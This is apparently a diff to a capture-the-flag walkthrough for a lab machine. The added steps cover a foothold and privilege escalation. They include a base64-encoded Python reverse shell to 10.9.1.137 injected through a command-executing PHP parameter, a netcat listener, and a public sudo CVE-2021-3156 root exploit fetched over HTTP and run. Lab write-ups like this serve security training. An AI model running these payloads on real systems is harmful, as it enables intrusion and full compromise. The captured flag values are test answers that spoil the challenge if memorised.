@@ -48,9 +48,10 @@ SMB version: 4.5.9 --> vulnerable to CVE-2017-7494
 https://drive.google.com/file/d/1b0Pbc8xdLGaVjGe8nNJqP2MityPsKfJD/view?usp=sharing
 
 for any errors resulted for using the exploits, refer to the Writeup section to fix
-7. Not all errors will be encountered
 
 #### *players are expected to search and fix the errors themselves*
+7. Not all errors will be encountered
+8. change the reverseshell ip and port below as prefer
 
 ## Writeup
 
@@ -230,7 +231,73 @@ http://underdevelopment.designer.htb/development.php?display={some base64 hash}
 
 *development.php shows that it decodes the "display" parameter as base64 hash and run as bash
 
-        echo "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.9.1.137',666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\"" | base64 -w 0
+11. Foothold
+
+        $ echo "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.9.1.137',666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\"" | base64 -w 0
         cHl0aG9uMyAtYyAiaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoJzEwLjkuMS4xMzcnLDY2NikpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWycvYmluL2Jhc2gnLCctaSddKTsiCg==
 
-<img src=""/>
+        $ curl http://underdevelopment.designer.htb/development.php?display=cHl0aG9uMyAtYyAiaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoJzEwLjkuMS4xMzcnLDY2NikpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWycvYmluL2Jhc2gnLCctaSddKTsiCg==
+
+        $ sudo nc -lvnp 666
+        listening on [any] 666 ...
+        connect to [10.9.1.137] from (UNKNOWN) [10.10.236.231] 44334
+        bash: cannot set terminal process group (752): Inappropriate ioctl for device
+        bash: no job control in this shell
+        To run a command as administrator (user "root"), use "sudo <command>".
+        See "man sudo_root" for details.
+
+        cybercraze@designer:/var/www/subdomains/underdevelopment$ cat ~/user.txt
+        cat ~/user.txt
+        c32ba831818880876035e98d868b9b70
+        
+12. Privilege Escalation
+
+        cybercraze@designer:/var/www/subdomains/underdevelopment$ sudo --version
+        sudo --version
+        Sudo version 1.8.31
+        Sudoers policy plugin version 1.8.31
+        Sudoers file grammar version 46
+        Sudoers I/O plugin version 1.8.31
+
+*refer to https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit  <-- CVE-2021-3156
+
+*check if sudo is vulnerable
+
+        cybercraze@designer:/var/www/subdomains/underdevelopment$ sudoedit -s Y
+        sudoedit -s Y
+        sudoedit: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+
+this cve exploits the password prompt for buffer overflow. hence we need to escalate the shell to allow the terminal to read for password
+
+        cybercraze@designer:/var/www/subdomains/underdevelopment$ python3 -c "import pty;pty.spawn('/bin/bash')"
+
+        cybercraze@designer:/var/www/subdomains/underdevelopment$ sudoedit -s Y
+        sudoedit -s Y
+        [sudo] password for cybercraze: --> THIS SHOWS THAT SUDOEDIT IS VULNERABLE
+
+set up the exploit and zip the whole directory
+
+        $ git clone https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit
+        $ cd Sudo-1.8.31-Root-Exploit/
+        $ make
+        mkdir libnss_x
+        cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
+        cc -O3 -o exploit exploit.c
+        $ cd ../
+        $ zip -r sudo-1.8.31.zip Sudo-1.8.31-Root-Exploit/
+
+transfer the exploit zip file to the target machine
+
+        $ ls
+        exploit-CVE-2017-7494  impacket  link  Sudo-1.8.31-Root-Exploit  sudo-1.8.31.zip
+        $ python3 -m http.server
+        
+        cybercraze@designer:/var/www/subdomains/underdevelopment$ cd /tmp                                                                       
+        cybercraze@designer:/tmp$ wget 10.9.1.137:8000/sudo-1.8.31.zip                                                                                          
+        cybercraze@designer:/tmp$ unzip sudo-1.8.31.zip
+        cybercraze@designer:/tmp$ cd Sudo-1.8.31-Root-Exploit
+        cybercraze@designer:/tmp/Sudo-1.8.31-Root-Exploit$ ./exploit
+        # whoami
+        root
+        # cat /root/root.txt
+        4e2ada627f08f9dee6f3acf12adc2511
